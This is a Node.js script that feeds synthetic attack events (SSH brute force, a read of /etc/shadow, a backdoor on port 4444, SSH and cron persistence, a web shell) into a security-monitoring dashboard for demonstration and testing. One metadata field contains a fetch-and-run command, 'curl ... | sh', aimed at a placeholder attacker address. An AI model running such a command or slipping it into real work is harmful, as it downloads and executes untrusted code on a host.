#!/usr/bin/env node
// Plays a realistic attack against the SOC API as if it came from an agent, so you can
// see detections, correlation and the dashboard without a real VPS.
//
//   node scripts/simulate-attack.mjs                 (reads token + port from .env)
//   SOC_URL=http://localhost:8088 SOC_AGENT_TOKEN=... node scripts/simulate-attack.mjs
import { readFileSync } from 'node:fs'

const env = {}
try {
  for (const line of readFileSync(new URL('../.env', import.meta.url), 'utf8').split(/\r?\n/)) {
    const m = line.match(/^([A-Z_]+)=(.*)$/)
    if (m) env[m[1]] = m[2]
  }
} catch { /* no .env: rely on environment variables */ }

const URL_BASE = process.env.SOC_URL ?? `http://localhost:${env.SOC_PORT || 8088}`
const TOKEN = process.env.SOC_AGENT_TOKEN ?? env.SOC_AGENT_TOKEN
const HOST = process.env.SOC_HOST_ID ?? 'vps-demo'
if (!TOKEN) {
  console.error('SOC_AGENT_TOKEN not found (.env or environment)')
  process.exit(1)
}

async function post(path, body) {
  const res = await fetch(URL_BASE + path, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${TOKEN}` },
    body: JSON.stringify(body),
  })
  if (!res.ok) throw new Error(`${path}: ${res.status} ${await res.text()}`)
  return res.status === 204 ? null : res.json()
}

const now = Date.now()
const at = (secondsAgo) => new Date(now - secondsAgo * 1000).toISOString()
const ev = (type, secondsAgo, extra = {}) => ({ type, occurredAt: at(secondsAgo), ...extra })

// Documentation/test ranges (RFC 5737), so no real address is accused of anything.
const BOTS = ['203.0.113.10', '203.0.113.77', '198.51.100.23']
const ATTACKER = '198.51.100.66'
const ADMIN = '192.0.2.15'
const USERS = ['root', 'admin', 'ubuntu', 'test', 'oracle', 'postgres', 'git', 'deploy']

const events = [
  ev('AGENT_STARTED', 3600, { message: 'agent demo started', metadata: { version: 'demo' } }),
  ev('PORT_BASELINE', 3590, { message: 'baseline of 3 listening ports recorded' }),
  // Normal admin activity
  ev('SSH_LOGIN_SUCCESS', 3000, { sourceIp: ADMIN, username: 'thiago', metadata: { method: 'publickey' } }),
  ev('SUDO_COMMAND', 2990, { username: 'thiago', metadata: { command: '/usr/bin/apt update', runAs: 'root' } }),
]

// Internet background noise: bots spraying usernames over the last hour
BOTS.forEach((ip, b) => {
  for (let i = 0; i < 25; i++) {
    const user = USERS[(i + b) % USERS.length]
    const t = 3400 - b * 900 - i * 2
    events.push(ev(user === 'root' ? 'SSH_FAILED_LOGIN' : 'SSH_INVALID_USER', t, { sourceIp: ip, username: user, metadata: { method: 'password' } }))
  }
})

// The real attack: brute force against 'deploy', then it works
for (let i = 0; i < 14; i++) {
  events.push(ev('SSH_FAILED_LOGIN', 300 - i * 3, { sourceIp: ATTACKER, username: 'deploy', metadata: { method: 'password' } }))
}
events.push(
  ev('SSH_LOGIN_SUCCESS', 240, { sourceIp: ATTACKER, username: 'deploy', metadata: { method: 'password' } }),
  ev('SUDO_COMMAND', 200, { username: 'deploy', metadata: { command: '/usr/bin/cat /etc/shadow', runAs: 'root' } }),
  ev('PORT_OPENED', 150, {
    username: 'root',
    message: 'tcp port 0.0.0.0:4444 opened (process kworkerd, pid 31337)',
    metadata: { proto: 'tcp', address: '0.0.0.0', port: 4444, process: 'kworkerd', exe: '/tmp/.x/kworkerd', pid: 31337 },
  }),
  ev('SUDO_DENIED', 120, { username: 'www-data', metadata: { command: '/bin/bash', runAs: 'root' } }),
)

// Persistence, as the agent's file integrity and process monitors would report it
const fileMeta = (path, size, mode, extra) => ({ path, size, owner: 'root:root', mode, mtime: at(100), ...extra })
events.push(
  ev('FILE_BASELINE', 3580, {
    message: 'baseline of 6 monitored files recorded',
    metadata: { files: ['/etc/crontab', '/etc/group', '/etc/passwd', '/etc/shadow', '/etc/ssh/sshd_config', '/etc/sudoers'] },
  }),
  ev('FILE_CREATED', 110, {
    message: 'monitored file created: /root/.ssh/authorized_keys (742 bytes, owner root:root)',
    metadata: fileMeta('/root/.ssh/authorized_keys', 742, '-rw-------', { newHash: 'c3a1f0e9b2d47a85e6f1c0b9d8a7e6f5c4b3a2918070605040302010f0e0d0c0' }),
  }),
  ev('FILE_MODIFIED', 100, {
    message: 'monitored file modified: /etc/ssh/sshd_config (3264 -> 3265 bytes)',
    metadata: fileMeta('/etc/ssh/sshd_config', 3265, '-rw-r--r--', {
      oldHash: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
      newHash: '60303ae22b998861bce3b28f33eec1be758a213c86c93c076dbe9f558c11c752',
      oldSize: 3264,
      addedLines: ['PermitRootLogin yes'],
      removedLines: ['PermitRootLogin prohibit-password'],
    }),
  }),
  ev('FILE_CREATED', 90, {
    message: 'monitored file created: /etc/cron.d/kworkerd (52 bytes, owner root:root)',
    metadata: fileMeta('/etc/cron.d/kworkerd', 52, '-rw-r--r--', { newHash: 'fd61a03af4f77d870fc21e05e7e80678095c92d808cfb3b5c279ee04c74aca13' }),
  }),
  ev('PROCESS_SUSPICIOUS', 60, {
    username: 'www-data',
    message: 'suspicious process (WEB_SHELL): sh pid 31400 exe /usr/bin/dash parent php-fpm8.3 pid 905',
    metadata: {
      reason: 'WEB_SHELL', pid: 31400, ppid: 905, startTime: 8812345, comm: 'sh', exe: '/usr/bin/dash',
      cmdline: 'sh -c curl -s http://198.51.100.66/k | sh', uid: '33', user: 'www-data',
      parentComm: 'php-fpm8.3', parentExe: '/usr/sbin/php-fpm8.3', parentUser: 'www-data',
    },
  }),
  // The agent's local guard already blocked one of the bots on its own (works with the SOC off)
  ev('RESPONSE_EXECUTED', 1575, {
    sourceIp: BOTS[2], message: ` bloqueado automaticamente pelo agente`,
    metadata: { action: 'BLOCK_IP', origin: 'agent', status: 'SUCCEEDED', reason: '10 falhas de login SSH em 2m0s', ip: BOTS[2], ttlSeconds: 86400, until: new Date(now + 86400e3 - 1575e3).toISOString() },
  }),
)

events.sort((a, b) => a.occurredAt.localeCompare(b.occurredAt))

await post('/api/v1/ingest/heartbeat', {
  hostId: HOST, hostname: HOST, os: 'Ubuntu 24.04.1 LTS (demo)', agentVersion: 'demo', heartbeatIntervalSeconds: 30,
  metrics: { cpuPercent: 37.5, memPercent: 61.2, memTotalBytes: 4 * 2 ** 30, memUsedBytes: 2.4 * 2 ** 30, diskPercent: 72.4, diskTotalBytes: 50 * 2 ** 30, load1: 0.82, load5: 0.6, load15: 0.4, uptimeSeconds: 864000,
    swapPercent: 12.5, netRxBps: 48200, netTxBps: 1250000, tcpEstablished: 23, processes: 141 },
  posture: {
    sessions: [{ user: 'deploy', tty: 'pts/1', host: ATTACKER, loginAt: at(240) }, { user: 'thiago', tty: 'pts/0', host: ADMIN, loginAt: at(3000) }],
    pendingUpdates: 23, securityUpdates: 7, rebootRequired: true, failedUnits: ['nginx.service'],
    ssh: { permitRootLogin: 'yes', passwordAuthentication: 'yes', maxAuthTries: '6' },
    firewall: { enabled: true, blockedIps: 1, droppedPackets: 1873, droppedBytes: 112380 },
  },
  response: { enabled: true, autoBlock: true },
  openPorts: [
    { proto: 'tcp', address: '0.0.0.0', port: 22, process: 'sshd', exe: '/usr/sbin/sshd', pid: 812, user: 'root' },
    { proto: 'tcp', address: '0.0.0.0', port: 80, process: 'nginx', exe: '/usr/sbin/nginx', pid: 901, user: 'root' },
    { proto: 'tcp', address: '127.0.0.1', port: 5432, process: 'postgres', exe: '/usr/lib/postgresql/16/bin/postgres', pid: 950, user: 'postgres' },
    { proto: 'tcp', address: '0.0.0.0', port: 4444, process: 'kworkerd', exe: '/tmp/.x/kworkerd', pid: 31337, user: 'root' },
  ],
})

let accepted = 0
for (let i = 0; i < events.length; i += 50) {
  const r = await post('/api/v1/ingest/events', { hostId: HOST, events: events.slice(i, i + 50) })
  accepted += r.accepted
}
console.log(`Sent ${accepted} events for host "${HOST}" to ${URL_BASE}. Open the dashboard to see the incidents.`)

// --play-agent: answer the SOC's containment actions for a while, the way the real agent would
// (it only pretends: nothing is blocked or killed on this machine).
if (process.argv.includes('--play-agent')) {
  console.log('Playing the agent for 30 s: polling for actions…')
  const until = Date.now() + 30_000
  while (Date.now() < until) {
    const { actions } = await post('/api/v1/ingest/actions/poll', { hostId: HOST })
    for (const a of actions) {
      const ip = a.params?.ip
      const result = {
        BLOCK_IP: { output: `${ip} bloqueado no firewall (nftables) [simulado]`, details: { ip, until: new Date(Date.now() + (a.params.ttlSeconds ?? 86400) * 1000).toISOString() } },
        UNBLOCK_IP: { output: `${ip} desbloqueado [simulado]`, details: { ip } },
        KILL_PROCESS: { output: `processo ${a.params?.pid} encerrado com SIGKILL; binário preservado em /var/lib/vps-soc-agent/quarantine [simulado]`, details: {} },
        DISK_CLEANUP: { output: 'limpeza concluída, 812.4 MB liberados [simulado]', details: { freedBytes: 851853312 } },
        RESTART_SERVICE: { output: `${a.params?.unit} reiniciado e ativo [simulado]`, details: {} },
      }[a.type] ?? { output: 'ok', details: {} }
      await post(`/api/v1/ingest/actions/${a.id}/result`, { hostId: HOST, status: 'SUCCEEDED', ...result })
      console.log(`  #${a.id} ${a.type} ${a.params?.ip ?? a.params?.pid ?? a.params?.unit ?? ''} → SUCCEEDED`)
    }
    await new Promise((r) => setTimeout(r, 2000))
  }
}
